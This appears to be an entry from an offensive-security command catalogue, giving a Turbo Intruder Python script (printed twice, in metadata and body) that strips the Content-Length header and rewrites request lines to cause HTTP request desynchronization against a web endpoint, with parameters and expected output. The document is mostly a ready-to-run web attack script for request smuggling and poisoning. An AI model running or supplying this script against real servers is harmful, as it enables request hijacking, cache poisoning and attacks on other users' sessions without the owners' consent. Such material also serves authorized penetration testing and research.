---
data: |-
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=5,
                             requestsPerConnection=100,
                             pipeline=False,
                             engine=Engine.THREADED
                             )
      for word in range(1, 100):
          if word % 2:
              CleanReq = re.sub(r' Content-length: [0-9]+', 'Null-head: test%s', target.req)
              CleanReq = re.sub(r'GET [^v]*v: ', '\r\n', CleanReq)
              engine.queue(CleanReq, word)
          engine.queue(target.req, word)
  def handleResponse(req, interesting):
      table.add(req)
tags:
  - desynchronization
type: command
executor: python
platforms:
  - Web
id: b4e9732b-b349-46cf-9315-9dc188321d85
created_at: '2025-12-13T09:01:21.555Z'
updated_at: '2025-12-13T09:01:21.555Z'
verified: false
validated: true
submitted: true
---
# Turbo Intruder Desync Script

## Command

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )
    for word in range(1, 100):
        if word % 2:
            CleanReq = re.sub(r' Content-length: [0-9]+', 'Null-head: test%s', target.req)
            CleanReq = re.sub(r'GET [^v]*v: ', '\r\n', CleanReq)
            engine.queue(CleanReq, word)
        engine.queue(target.req, word)
def handleResponse(req, interesting):
    table.add(req)
```

## Description

Turbo Intruder script to simulate request poisoning and desynchronization by queuing modified requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `concurrentConnections` | Number of concurrent connections (5) | Yes |
| `requestsPerConnection` | Requests per connection (100) | Yes |

## Examples

### Basic Usage

```python
# Run in Turbo Intruder
queueRequests(target, wordlists)
```

## Expected Output

Table of responses showing desynchronized requests.

## Related

- [[procedures/Simulate-Request-Desynchronization-with-Turbo-Intruder]]
